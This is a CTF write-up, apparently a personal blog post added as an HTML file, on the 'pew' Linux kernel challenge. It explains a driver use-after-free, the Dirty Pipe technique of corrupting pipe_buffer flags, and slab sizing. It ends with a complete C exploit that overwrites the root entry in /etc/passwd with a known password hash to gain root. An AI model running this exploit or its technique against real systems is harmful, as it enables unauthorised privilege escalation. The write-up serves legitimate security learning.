@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>pew write-up</title>
+</head>
+<body>
+
+        <h1>pew write-up (<a href="./index.html">home</a>)</h1>
+
+<h1>Prologue</h1>
+<p>
+<code>pew</code> is a CTF challenge that was distributed in codegate 2025. I don't know who the author is.
+</p>
+
+<blockquote> The front and tail are supposed to work together -- Wilford in Snowpiercer </blockquote>
+
+<p>Date: 2025-12-20</p>
+
+<h1>Introduction</h1>
+We're given the following files
+<ul>
+	<li>prob/</li>
+	<li>client.py</li>
+	<li>Kconfig</li>
+	<li>docker-compose.yml</li>
+	<li>Dockerfile</li>
+	<li>prob/rootfs.img.gz</li>
+	<li>prob/run.sh</li>
+	<li>prob/bridge.py</li>
+	<li>prob/ynetd</li>
+	<li>prob/bzImage</li>
+</ul>
+
+<p>
+<code>bzImage</code> is the compressed linux kernel image, and <code>rootfs.img.gz</code> is the initramfs. Inside the initramfs is vulnerable kernel driver called <code>pew.ko</code>, which the init script loads after booting. The flag is in <code>/flag</code> and is <em>only</em> readable by the root user.
+</p>
+
+<h1><code>pew.ko</code></h1>
+The challenge does not provide the source for the vulnerable driver. Therefore, we'll have to look at the disassembly to get a high-level view of what's going on.
+
+So the important functions are,
+<pre>
+<code>
++0x00    int64_t pew_open()
+
++0x10        if (buffer == 0)
++0x1e            uint64_t rax_1 = __kmalloc(MAX_BUF, 0x400dc0) /* MAX_BUF = 0x1000 */
++0x23            buffer = rax_1
++0x23            
++0x2d            if (rax_1 == 0)
++0x3f                device_destroy(my_class, zx.q(my_dev_major << 0x14))
++0x4b                class_destroy(my_class)
++0x57                cdev_del(&my_dev)
++0x67                unregister_chrdev_region(zx.q(dev), 1)
++0x67        
++0x74        return __x86_return_thunk() __tailcall
+</code>
+</pre>
+
+and,
+
+<pre>
+<code>
++0x00    int64_t pew_ioctl(void* arg1, uint64_t arg2, uint64_t arg3)
+
++0x0b        if (arg2.d != 0x1003)
++0x13            if (arg2.d == 0x1002)
++0x13                return set_val(arg1, arg2, val: arg3.b) __tailcall
++0x13            
++0x1b            if (arg2.d == 0x1001)
++0x1d                off = arg3
++0x29                return __x86_return_thunk() __tailcall
++0x36        // single write?
++0x0b        else if (allowed != 0) /* allowed initialised to 1 */
++0x38            uint64_t off_1 = off
++0x38            
++0x46            if (off_1 u<= MAX_BUF)  // 1 byte OOB
++0x48                allowed = 0
++0x4f                uint64_t buffer_1 = buffer
++0x4f                
++0x59                if (buffer_1 != 0)
++0x62                    *(buffer_1 + off_1) = val
++0x6a                    return __x86_return_thunk() __tailcall
++0x6a        
++0x7b        return __x86_return_thunk() __tailcall
+
++0x00    int32_t set_val(void* arg1, void* arg2, char val)
+
++0x00        val = val
++0x0b        return __x86_return_thunk() __tailcall
+</code>
+</pre>
+
+and,
+
+<code>
+<pre>
++0x0    int64_t __cfi_pew_release(struct file* arg1, unsigned int arg2, 
++0x0      unsigned long arg3)
+
++0xf        return free_buf(flip: arg1, cmd: arg2, arg: arg3) __tailcall
+
+
++0x00    long free_buf(struct file* flip, unsigned int cmd, unsigned long arg)
+
++0x05        uint64_t buffer_1 = buffer
++0x05        
++0x0f        if (buffer_1 != 0)
++0x11            kfree(buffer_1)
++0x11        
++0x18        return __x86_return_thunk() __tailcall
+</pre>
+</code>
+
+and finally,
+
+<pre>
+<code>
++0x00    int64_t cleanup_module()
+
++0x07        uint32_t rbx_1 = my_dev_major << 0x14
++0x13        device_destroy(my_class, zx.q(rbx_1))
++0x1f        class_destroy(my_class)
++0x2b        cdev_del(&my_dev)
++0x38        return unregister_chrdev_region(zx.q(rbx_1), 1) __tailcall
+</code>
+</pre>
+
+<p>
+Take a moment to read the code and see if you can spot the vulnerability/vulnerabilities.
+<br>
+<br>
+Okay I'm going to give <em>an</em> answer.
+<br>
+<br>
+Ready?
+</p>
+
+<p>
+So, first notice that <code>pew_open</code> allocates kernel heap memory, and stores the pointer to it in a global static variable called <code>buffer</code> if it was originally NULL. Also notice that when the device is closed, the <code>buffer</code> variable is <em>not</em> set to NULL. Therefore, opening a new device results in it using a pointer to free'd memory!
+</p>
+
+<p>
+Also, notice that in <code>pew_ioctl</code>, we can hit the <code>set_val</code> function to set the global <code>val</code> variable. We can do a similar thing to set the global <code>off</code> variable. Finally, we are able to write <code>val</code> at offset <code>off</code> into <code>buffer</code>. Also notice that there is potential for an off-by-one write into <code>buffer</code>. Luckily, I didn't <em>have</em> to use this vulnerability, but it's there to be taken advantage off by doing a page jack for example.
+</p>
+
+<p>
+The main point is that there is a classic use-after-free on 0x1000 bytes of allocated memory! However, we have the following caveats: we can only write a single byte, once. That's it. After we've written our byte into free'd memory, we can't touch the driver again. The code ensures there's no more writes :o
+</p>
+
+<h1> Exploit </h1>
+<p>
+We've got our vulnerability, so now it's time to pick our target object. We also have to make sure that it lands in the same slab cache as memory allocated by the driver. More on that later. For now, lets try corrupting out trusty <code>struct pipe_buffer</code> object. We are restricted to corrupting just a single byte in this struct, so what do we do?
+</p>
+
+<p>
+Let's take a look at <code>struct pipe_buffer</code> (again, if you've seen my older posts :D),
+
+<pre>
+<code>
+/**
+ *      struct pipe_buffer - a linux kernel pipe buffer
+ *      @page: the page containing the data for the pipe buffer
+ *      @offset: offset of data inside the @page
+ *      @len: length of data inside the @page
+ *      @ops: operations associated with this buffer. See @pipe_buf_operations.
+ *      @flags: pipe buffer flags. See above.
+ *      @private: private data owned by the ops.
+ **/
+struct pipe_buffer {
+        struct page *page;
+        unsigned int offset, len;
+        const struct pipe_buf_operations *ops;
+        unsigned int flags;
+        unsigned long private;
+};
+</code>
+</pre>
+
+Okay, let's see what looks interesting to corrupt. Perhaps the last byte of some pointers? We could do that, but what about the <code>flags</code> field? When I think of flags, I think of bits being set which a single byte overwrite can do.
+
+</p>
+
+<p>
+What do we overwrite flags to? Well, there exists a technique called <a href="https://dirtypipe.cm4all.com/">"Dirty Pipe"</a> named by Max Kellermann. From here onwards, I'll assume you've read the article. Don't worry, I'll still explain what I'm doing, but please familiarise yourself with the idea of splicing contents on to a pipe.
+</p>
+
+<h1> Dirty Pipe </h1>
+<p>
+In this technique, we corrupt the flags member to be equal to <code>PIPE_BUF_FLAG_CAN_MERGE</code>, which is equal to 0x10 in the Linux kernel. But what does this actually do? Good question. Let's first look at the <code>splice</code> system call
+</p>
+
+<h1> Splice system call </h1>
+In this technique, we will be splicing a file <em>on</em> a pipe. Think of it like taking the bytes of a file (say <code>/etc/passwd</code> hehehe) and pouring them into the pipe. Someone else can then read from the pipe and see the file contents. The best part- it all happens in the kernel. No need to copy contents into userspace to forward them to another process for example.
+
+Anyways, I won't bore you with every single detail in the kernel code, but whatever file system you are using will most likely use this,
+
+<pre>
+<code>
+/**
+ * filemap_splice_read -  Splice data from a file's pagecache into a pipe
+ * @in: The file to read from
+ * @ppos: Pointer to the file position to read from
+ * @pipe: The pipe to splice into
+ * @len: The amount to splice
+ * @flags: The SPLICE_F_* flags
+ *
+ * This function gets folios from a file's pagecache and splices them into the
+ * pipe.  Readahead will be called as necessary to fill more folios.  This may
+ * be used for blockdevs also.
+ *
+ * Return: On success, the number of bytes read will be returned and *@ppos
+ * will be updated if appropriate; 0 will be returned if there is no more data
+ * to be read; -EAGAIN will be returned if the pipe had no space, and some
+ * other negative error code will be returned on error.  A short read may occur
+ * if the pipe has insufficient space, we reach the end of the data or we hit a
+ * hole.
+ */
+
+ssize_t filemap_splice_read(struct file *in, loff_t *ppos,
+                            struct pipe_inode_info *pipe,
+                            size_t len, unsigned int flags)
+{
+        ...
+        error = filemap_get_pages(&iocb, len, &fbatch, true);
+        if (error < 0)
+                break;
+        
+        ...
+        
+        for (i = 0; i < folio_batch_count(&fbatch); i++) {
+                struct folio *folio = fbatch.folios[i];
+                size_t n;
+        
+                if (folio_pos(folio) >= end_offset)
+                        goto out;
+                folio_mark_accessed(folio);
+        
+                /*
+                 * If users can be writing to this folio using arbitrary
+                 * virtual addresses, take care of potential aliasing
+                 * before reading the folio on the kernel side.
+                 */
+                if (writably_mapped)
+                        flush_dcache_folio(folio);
+        
+                n = min_t(loff_t, len, isize - *ppos);
+                n = splice_folio_into_pipe(pipe, folio, *ppos, n);
+                if (!n)
+                        goto out;
+                len -= n;
+                total_spliced += n;
+                *ppos += n;
+                in->f_ra.prev_pos = *ppos;
+                if (pipe_is_full(pipe))
+                        goto out;
+        }
+        
+        ...
+</code>
+</pre>
+
+and,
+
+<pre>
+<code>
+/*
+ * Splice subpages from a folio into a pipe.
+ */
+size_t splice_folio_into_pipe(struct pipe_inode_info *pipe,
+                              struct folio *folio, loff_t fpos, size_t size)
+{
+        struct page *page;
+        size_t spliced = 0, offset = offset_in_folio(folio, fpos);
+
+        page = folio_page(folio, offset / PAGE_SIZE);
+        size = min(size, folio_size(folio) - offset);
+        offset %= PAGE_SIZE;
+
+        while (spliced < size && !pipe_is_full(pipe)) {
+                struct pipe_buffer *buf = pipe_head_buf(pipe);
+                size_t part = min_t(size_t, PAGE_SIZE - offset, size - spliced);
+
+                *buf = (struct pipe_buffer) {
+                        .ops    = &page_cache_pipe_buf_ops,
+                        .page   = page,
+                        .offset = offset,
+                        .len    = part,
+                };
+                folio_get(folio);
+                pipe->head++;
+                page++;
+                spliced += part;
+                offset = 0;
+        }
+
+        return spliced;
+}
+</code>
+</pre>
+
+<p>
+The description of the function is honestly enough to understand it. Pretty much, it gets the page cache entries of the file, and puts them into the <code>struct pipe_buffer</code> objects of the pipe. I've put the important parts of the code here, and reading it along with the comments will make it clear.
+</p>
+
+<p>
+Anyways, you might be wondering why we can't just splice an important file like <code>/etc/passwd</code> into the pipe, and then overwrite it by entering data into the write end of the pipe?
+Good question! It all comes down to that pesky <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag. Notice in the above code that the initialisation of <code>buf</code> in <code>splice_folio_into_pipe</code> will set the <code>flags</code> member in the struct to 0, despite it noe being literally written out. Alright, let's look at what happens if you try overwriting the file!
+</p>
+
+<p>
+Let's see what the kernel does if you try and write to a pipe,
+
+<pre>
+<code>
+static ssize_t
+anon_pipe_write(struct kiocb *iocb, struct iov_iter *from)
+{
+...
+/*
+ * If it wasn't empty we try to merge new data into
+ * the last buffer.
+ *
+ * That naturally merges small writes, but it also
+ * page-aligns the rest of the writes for large writes
+ * spanning multiple pages.
+ */
+head = pipe->head;
+was_empty = pipe_empty(head, pipe->tail);
+chars = total_len & (PAGE_SIZE-1);
+        ...
+        if (chars && !was_empty) {
+                struct pipe_buffer *buf = pipe_buf(pipe, head - 1);
+                int offset = buf->offset + buf->len;
+        
+                if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&
+                    offset + chars <= PAGE_SIZE) {
+                        ret = pipe_buf_confirm(pipe, buf);
+                        if (ret)
+                                goto out;
+        
+                        ret = copy_page_from_iter(buf->page, offset, chars, from);
+                        if (unlikely(ret < chars)) {
+                                ret = -EFAULT;
+                                goto out;
+                        }
+        
+                        buf->len += ret;
+                        if (!iov_iter_count(from))
+                                goto out;
+                }
+        }
+
+        ...
+
+        for(;;) {        
+
+        ...
+
+                if (!pipe_full(head, pipe->tail, pipe->max_usage)) {
+                        struct pipe_buffer *buf;
+                        struct page *page;
+                        int copied;
+
+                        page = anon_pipe_get_page(pipe);
+                        if (unlikely(!page)) {
+                                if (!ret)
+                                        ret = -ENOMEM;
+                                break;
+                        }
+
+                        copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
+                        if (unlikely(copied < PAGE_SIZE && iov_iter_count(from))) {
+                                anon_pipe_put_page(pipe, page);
+                                if (!ret)
+                                        ret = -EFAULT;
+                                break;
+                        }
+
+                        pipe->head = head + 1;
+                        /* Insert it into the buffer array */
+                        buf = pipe_buf(pipe, head);
+                        buf->page = page;
+                        buf->ops = &anon_pipe_buf_ops;
+                        buf->offset = 0;
+                        if (is_packetized(filp))
+                                buf->flags = PIPE_BUF_FLAG_PACKET;
+                        else
+                                buf->flags = PIPE_BUF_FLAG_CAN_MERGE;
+
+                        buf->len = copied;
+                        ret += copied;
+
+                        if (!iov_iter_count(from))
+                                break;
+
+                        continue;
+                }
+
+        }
+
+...
+
+}
+</code>
+</pre>
+
+Take some time to understand the code. I've put the important bits above. Prety much, if the pipe has the <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag set, it <em>will</em> start writing directly into the page cache entry! That flag pretty much ensures that you start writing <em>exactly</em> where your left on the pipe. The 'cursor' of the pipe will smoothly scan over the pipe pages. Unfortunately, the flag is 0 as I previously said. So, what ends up happening is that the write contents will go into a <em>new</em> page, and we don't end up overwriting our page-cache page data :(
+</p>
+
+<p>
+However, we do have that UAF write :D So, what we can do is this:
+<ol>
+        <li> Create a pipe </li>
+        <li> Splice a single byte of out target file into the pipe to bring its page cache entry into the pipe buffer </li>
+        <li> Corrupt the flags member of the pipe buffer to be equal to <code>PIPE_BUF_FLAG_CAN_MERGE </li>
+        <li> Overwrite the file contents by using the <code>write</code> system call on the pipe </li>
+</ol>
+</p>
+
+<h1> Slab allocation </h1>
+<p>
+We are so close! We just have to make sure that the pipe buffers will land in the same slab cache as the driver allocated memory. So the pipe buffers are going to land inside a <code>GFP_KERNEL_ACCOUNT</code> cache. The flags for the driver <code>kmalloc</code> are 0x400dc0, which <em>does</em> have the 22nd bit set (phew). But also, the pipe buffers need to be allocated in a slab that's large enough. By default, 16 pipe buffers are allocated which is 0x280 bytes- far away from the desired 0x1000 bytes.
+<p>
+
+<p>
+To increase the size of the pipe buffer array, we can use the <code>fcntl</code> system call with the <code>F_SETPIPE_SZ</code> flag. We need to supply a power-of-2 number of pages to be backed by the pipe. If we select 64 pages, that will be 0xa00 bytes (remember each pipe buffer is 0x28 in size) for the pipe buffer array, which will land in the kmalloc-cg-4k slabs!
+</p>
+
+<h1> Exploit </h1>
+<p>
+And now, for the moment you've been waiting for... the exploit code.
+<pre>
+<code>
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <fcntl.h>
+#include <poll.h>
+#include <sched.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+
+#define CORE_ID                                                             0
+#define DEV_PATH                                                   "/dev/pew"
+#define FLAGS_OFF                                                          24
+#define FLAG_PATH                                                     "/flag"
+#define FLAG_SIZE                                                          17
+#define NUM_PAGES                                                          64
+#define PASSWD_HASH                           "$1$root$9gr5KxwuEdiI80GtIzd.U0"
+#define PASSWD_PATH                                             "/etc/passwd"
+#define PASSWD_SIZE                                                        68
+#define PAYLOAD                 "oot:" PASSWD_HASH ":0:0:root:/root:/bin/bash"
+#define PIPE_BUF_FLAG_CAN_MERGE                                          0x10
+#define SET_OFF                                                        0x1001
+#define SET_VAL                                                        0x1002
+#define SPRAY_COUNT                                                     0x100
+#define WRITE_VAL                                                      0x1003
+#define array_size(arr)                            (sizeof(arr)/sizeof(*arr))
+
+static inline void err(const char* msg)
+{
+        errno ? perror(msg) : (void) fputs(msg, stderr);
+
+        exit(EXIT_FAILURE);
+}
+
+static int pin_cpu(int core_id)
+{
+        cpu_set_t cpuset;
+        CPU_ZERO(&cpuset);
+        CPU_SET(core_id, &cpuset);
+
+        return sched_setaffinity(getpid(), sizeof(cpuset), &cpuset);
+}
+
+int main (void)
+{
+        char payload[PASSWD_SIZE] = { 0 };
+        int fd_1 = -1;
+        int fd_2 = -1;
+        int passwd_fds[SPRAY_COUNT] = { 0 };
+        int pipefds[SPRAY_COUNT][2] = { 0 };
+        long page_size = sysconf(_SC_PAGESIZE);
+        ssize_t ssret = -1;
+
+        /* pin process onto a cpu */
+        if (pin_cpu(CORE_ID))
+                err("pin_cpu");
+
+        /* allocate buffer */
+        if ((fd_1 = open(DEV_PATH, O_RDWR)) == -1)
+                err("open " DEV_PATH);
+
+        /* free buffer */
+        if (close(fd_1))
+                err("close");
+
+        /* alloc pipe buffers */
+        for (size_t i = 0; i < SPRAY_COUNT; i++) {
+                if (pipe(pipefds[i]))
+                        err("pipe");
+        }
+
+        /* resize pipe buffers */
+        for (size_t i = 0; i < SPRAY_COUNT; i++) {
+                if (fcntl(pipefds[i][0], F_SETPIPE_SZ, page_size * NUM_PAGES) == -1)
+                        err("fcntl");
+        }
+
+        /* second reference to buffer */
+        if ((fd_2 = open(DEV_PATH, O_RDWR)) == -1)
+                err("open " DEV_PATH);
+
+        /* open /etc/passwd to read only, for now ;) */
+        for (size_t i = 0; i < array_size(passwd_fds); i++) {
+                if ((passwd_fds[i] = open(PASSWD_PATH, O_RDONLY)) == -1)
+                        err("open " PASSWD_PATH);
+        }
+
+        /* splice 1 byte of /etc/passwd into pipe */
+        for (size_t i = 0; i < array_size(passwd_fds); i++) {
+                ssret = splice(passwd_fds[i], NULL, pipefds[i][1], NULL, sizeof(char), 0);
+                if (ssret != sizeof(char))
+                        err("splice");
+        }
+
+        /* set write value to PIPE_BUF_FLAG_CAN_MERGE */
+        if (ioctl(fd_2, SET_VAL, (uint64_t) PIPE_BUF_FLAG_CAN_MERGE) != sizeof(char))
+                err("ioctl");
+
+        /* set offset to first pipe buffer's flag */
+        if (ioctl(fd_2, SET_OFF, (uint64_t) FLAGS_OFF) != sizeof(char))
+                err("ioctl");
+
+        /* corrupt the first pipe buffer's flag */
+        if (ioctl(fd_2, WRITE_VAL) != sizeof(char))
+                err("ioctl");
+
+        /* writing NULL bytes to /etc/passwd keeps the original data
+         * ...I think
+         */
+        memset(payload, '\0', sizeof(payload));
+
+        /* payload is now new entry for root user + NULL byte padding */
+        memcpy(payload, PAYLOAD, sizeof(PAYLOAD));
+
+        /* overwrite /etc/passwd */
+        for (size_t i = 0; i < array_size(passwd_fds); i++) {
+                if (write(pipefds[i][1], payload, sizeof(payload)) != sizeof(payload))
+                        err("write" PAYLOAD);
+        }
+
+        /* su root, then enter 'root' as the password */
+        if (system("/bin/sh") == -1)
+                err("system");
+
+        return EXIT_FAILURE;
+}
+</code>
+</pre>
+
+I've commented each step of the exploit in the code so it should make sense in combination with this post.
+
+</p>
+
+<h1>Epilogue</h1> 
+Thanks for reading this post! I initially wanted to do a Page Jack exploit on this challenge which I had taken a sneak peak in a submitted solution. I'll probably end up doing this challenged again with that technique down the line. Also, the exploit code has severe opsec issues, mainly relating to the fact that once the main process ends, the kernel will attempt to double free the driver allocation, causing a kernel panic. With a Page Jack page UAF, perhaps I can overwrite the current process descriptor's file descriptor table, and whatever other meta data the kernel keeps about the open file. That way, when the process ends, the kernel will be tricked into thinking the driver has no references, and we don't get the panic. I don't know if that will work, but it's just an idea.
+</body>
+</html>
+
